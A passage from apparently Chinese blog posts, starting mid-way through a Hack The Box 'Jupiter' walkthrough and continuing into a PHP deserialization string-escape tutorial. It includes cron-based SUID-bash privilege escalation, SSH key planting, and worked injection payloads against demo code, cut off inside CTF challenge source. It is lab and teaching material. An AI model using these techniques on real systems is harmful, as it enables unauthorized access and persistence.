alt=\"img\"></p>\n<p>发完出这个数据包，监听端口就接到了反弹shell</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-163.png\" alt=\"img\"></p>\n<h1 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h1><p>可以发现在home目录下有两个用户目录，所以想要拿到flag，还需要提权</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-164.png\" alt=\"img\"></p>\n<h3 id=\"postgres用户—-juno用户\"><a href=\"#postgres用户—-juno用户\" class=\"headerlink\" title=\"postgres用户—&gt;juno用户\"></a>postgres用户—&gt;juno用户</h3><h5 id=\"主机信息收集\"><a href=\"#主机信息收集\" class=\"headerlink\" title=\"主机信息收集\"></a>主机信息收集</h5><p>主机信息收集我一般都是直接上linpeas和pspy配合着来，当然也可以用其他的工具</p>\n<p>同样通过本地的http服务让目标通过wget下载好两个工具，chmod给执行权限，分别运行</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-165.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-166.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-167.png\" alt=\"img\"></p>\n<p>在linpeas中暂时没有发现能利用的点，而在pspy中，可以看到用户juno（uid&#x3D;1000）在有规律的执行一些命令，猜测可能是定时任务</p>\n<p>（注：如果系统不存在通用的提权漏洞，那我们就可以想办法借助目标用户的定时任务，通过修改文件等操作，让用户的定时任务执行时带上我们的恶意命令，以达到修改权限的目的）</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-168.png\" alt=\"img\"></p>\n<h5 id=\"定时任务提权\"><a href=\"#定时任务提权\" class=\"headerlink\" title=\"定时任务提权\"></a>定时任务提权</h5><p>我们借助gpt来帮助我们分析一下</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-169.png\" alt=\"img\"></p>\n<p>而所涉及文件中我们只能查看shadow命令执行的&#x2F;dev&#x2F;shm&#x2F;network-simulation.yml这个文件</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-170.png\" alt=\"img\"></p>\n<p>同样拿去gpt分析</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-171.png\" alt=\"img\"></p>\n<p>大概意思是是一个启动web服务模拟网络通信的脚本，而且在path和arg处可以执行带参数的命令，如果能改成chmod u+s &#x2F;bin&#x2F;bash，就可以成功借助定时任务提权</p>\n<p>所以我想直接修改一个path，然后上传覆盖掉原本的yaml脚本</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-172.png\" alt=\"img\"></p>\n<p>而我在pspy64上看到它并没有执行成功，只执行了上面的python命令</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-173.png\" alt=\"img\"></p>\n<p>所以得换一个思路</p>\n<p>这里也是通过查看大佬的思路发现可以利用cp命令将&#x2F;bin&#x2F;bash移出来（其实我不也太理解为啥直接操作&#x2F;bin&#x2F;bash不行）</p>\n<p>改完后是这样的</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-174.png\" alt=\"img\"></p>\n<p>上传覆盖，然后pspy64观察进程</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-175.png\" alt=\"img\"></p>\n<p>两个都成功执行了</p>\n<p>然后执行命令提权</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmp/bash -p</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-176.png\" alt=\"img\"></p>\n<p>可以看到，成功提权进入&#x2F;home&#x2F;juno（postpres用户进不去），但是还是没有访问flag的权限，所以我们得想办法通过ssh进去才行，这里我们有了进入&#x2F;home&#x2F;juno目录的权限，可以尝试ssh公钥写入</p>\n<h5 id=\"ssh公钥写入\"><a href=\"#ssh公钥写入\" class=\"headerlink\" title=\"ssh公钥写入\"></a>ssh公钥写入</h5><p>先在本地生成公私钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -f ydj</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-177.png\" alt=\"img\"></p>\n<p>回到目标，用python的pty生成一个好看一点的shell，然后重新执行一遍&#x2F;tmp&#x2F;bash -p命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c <span class=\"string\">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-178.png\" alt=\"img\"></p>\n<p>从本地下载公钥，cp到.ssh&#x2F;authorized_keys</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-179.png\" alt=\"img\"></p>\n<p>然后本地ssh私钥连接</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-180.png\" alt=\"img\"></p>\n<p>成功登录拿到flag</p>\n<p>（篇幅有限，后面的juno—&gt;jovian，jovian—&gt;root就先不讲了，也不是今天的重点）</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>总的来说，红队的攻击手法还是数不胜数的，但是终究离不开三板斧：信息收集、外网打点、内网横向。（该HTB靶场没有内网环境，就不做内网横向演示了）所以我们可以以这三个点为基础，然后不断扩展自己的知识面，争取早日成为一个可以独当一面的红队大佬！！！</p>\n","categories":["打靶"],"tags":["HTB"]},{"title":"PHP反序列化之字符逃逸","url":"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>对于这个知识点一直都是处于一知半解的状态，看懂了原理但是每次遇到都做不太出，所以想通过实操来帮助自己理解，以此文章来记录一下</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-漏洞原理\"><a href=\"#0x01-漏洞原理\" class=\"headerlink\" title=\"0x01 漏洞原理\"></a>0x01 漏洞原理</h1><p>开发人员将对用户输入的过滤放在了序列化之后，而且过滤的方式是选择了preg_replace()这类的函数用一些指定字符串来替换黑名单中的字符串，在加上PHP在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，反序列化的过程中必须严格这个规则才能执行，所以攻击者可以通过精心构造的payload使序列化之后的一些字符逃逸出来从而在程序反序列化时导入恶意数据以达到数据伪造和篡改等目的</p>\n<h1 id=\"0x02-漏洞演示\"><a href=\"#0x02-漏洞演示\" class=\"headerlink\" title=\"0x02 漏洞演示\"></a>0x02 漏洞演示</h1><h3 id=\"2-1-反序列化特性\"><a href=\"#2-1-反序列化特性\" class=\"headerlink\" title=\"2.1 反序列化特性\"></a>2.1 反序列化特性</h3><p>这是正常的反序列化</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660915-13.png\" alt=\"img\"></p>\n<p>而由于反序列化以 } 结尾的规则，在后面增加垃圾数据也不会影响反序列化的执行</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660911-1.png\" alt=\"img\"></p>\n<p>当然，序列化后数据的字符串长度要与长度值匹配，否则就会报错</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-2.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-3.png\" alt=\"img\"></p>\n<p>结合上述特性，攻击者在参数值可控的情况下便可以发起字符逃逸的攻击。</p>\n<p>序列化后的字符串在经过preg_replace()替换后存在增多和减少两种情况，所以下面我会分开演示</p>\n<h3 id=\"2-2-字符串增多\"><a href=\"#2-2-字符串增多\" class=\"headerlink\" title=\"2.2 字符串增多\"></a>2.2 字符串增多</h3><p>代码示例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//demo.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$pass</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$pass</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hacker&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">User</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>],<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>]));</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">&#x27;序列化：&#x27;</span>.<span class=\"variable\">$a</span>.<span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">&#x27;filter替换：&#x27;</span>.<span class=\"variable\">$b</span>.<span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>)))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(<span class=\"string\">&#x27;反序列化成功：&#x27;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(<span class=\"string\">&#x27;反序列化失败&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们的目标是利用字符逃逸修改不可控的变量flag的值为1</p>\n<p>这里username为其他字符串时正常反序列化</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-4.png\" alt=\"img\"></p>\n<p>而username为admin时，经过filter的替换字符串变长，无法反序列化</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-5.png\" alt=\"img\"></p>\n<p>我们先来演示一下攻击效果</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?username=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;&amp;password=123456</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-6.png\" alt=\"img\"></p>\n<p>可以看到，反序列化成功，并且成功修改flag值为1，我们来分析一下payload</p>\n<p>username传入的值为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从序列化后的结果可以看到其长度为276，而usrname中admin的个数为46，经过filter替换后46个admin变成46个hacker，而46个hacker的长度刚好为276，反序列化的时候username的值读取完最后一个hacker就结束了，所以后半段”;s:8:”password”;s:6:”123456”;s:4:”flag”;i:1;}就逃逸了出来，并且被成功反序列化，而 } 之后的所有数据自然成为了垃圾数据</p>\n<p>所以我们的攻击流程应该是</p>\n<ol>\n<li>确认后半段数据，也就是我们能够伪造的数据，并且确认该字符串的长度</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;        //长度为46</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>根据替换前后的字符串长度建立一元一次方程，使前半段在经过filter替换后长度增加为原本整一段的长度，以便后半段数据的逃逸，而方程的解即为前半段中被替换字符的个数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">5x+46=6x        //x=46</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>得到最终payload</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;    //admin*46</span><br></pre></td></tr></table></figure>\n\n<p>通过这种攻击方式，我们可以修改特定变量的值，甚至增加一些原本不存在的变量</p>\n<h3 id=\"2-3-字符串减少\"><a href=\"#2-3-字符串减少\" class=\"headerlink\" title=\"2.3 字符串减少\"></a>2.3 字符串减少</h3><p>代码示例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//demo.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$pass</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$pass</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;bad&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">User</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>],<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>]));</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">&#x27;序列化：&#x27;</span>.<span class=\"variable\">$a</span>.<span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">&#x27;filter替换：&#x27;</span>.<span class=\"variable\">$b</span>.<span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>)))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(<span class=\"string\">&#x27;反序列化成功：&#x27;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(<span class=\"string\">&#x27;反序列化失败&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>和上一个代码不同的地方在于admin被替换成了bad，减少了2个字符。</p>\n<p>同样先看攻击效果。</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?username=adminadminadminadminadminadminadminadminadminadminadmin&amp;password=;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-7.png\" alt=\"img\"></p>\n<p>修改成功，下面我们来分析一下该payload</p>\n<p>username传入的值为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadmin</span><br></pre></td></tr></table></figure>\n\n<p>password传入的值为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从序列化后的结果我们看到username的值的长度为55，而经过filter替换后实际长度减少，所以反序列化时会一直以55的长度往后继续读取数据”;s:8:”password”;s:45:，所以我们在password处传参要把被吞掉的这部分数据补上，同时加上我们要伪造的数据，即可攻击成功</p>\n<p>所以攻击流程应该为</p>\n<ol>\n<li>确认要被吞掉的数据和长度（这里得灵活一点，要是满足不了下面的方程可以自己加点长度，到时候借助password传进去就可以了，可以参考后面的例题）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:45:        //长度为22</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>根据上述数据的长度和字符串替换前后的长度构造一元一次方程，使经过filter替换后的字符串加上被吞的数据长度等于username原本的长度，该方程的解即为username处应该传入的admin个数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">22+3x=5x        //x=11</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>最后在password传入伪造的数据，这一部分的值在序列化的数据经过filter替换后跟在被吞进username值后面，成功被反序列化</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>得到最终pyload</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?username=adminadminadminadminadminadminadminadminadminadminadmin&amp;password=;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:4:&quot;flag&quot;;i:1;&#125;        //admin*11</span><br></pre></td></tr></table></figure>\n\n<p>和字符增多的攻击效果差不多</p>\n<h1 id=\"0x03-靶场实操\"><a href=\"#0x03-靶场实操\" class=\"headerlink\" title=\"0x03 靶场实操\"></a>0x03 靶场实操</h1><h3 id=\"3-1-CTFshow-月饼杯-web1-此夜圆-（字符串增多）\"><a href=\"#3-1-CTFshow-月饼杯-web1-此夜圆-（字符串增多）\" class=\"headerlink\" title=\"3.1 CTFshow-月饼杯-[web1_此夜圆] （字符串增多）\"></a>3.1 CTFshow-月饼杯-[web1_此夜圆] （字符串增多）</h3><p>提供了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$uname</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$uname</span>,<span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;uname=<span class=\"variable\">$uname</span>;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$password</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"string\">&#x27;yu22x&#x27;</span>)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">include</span>(<span 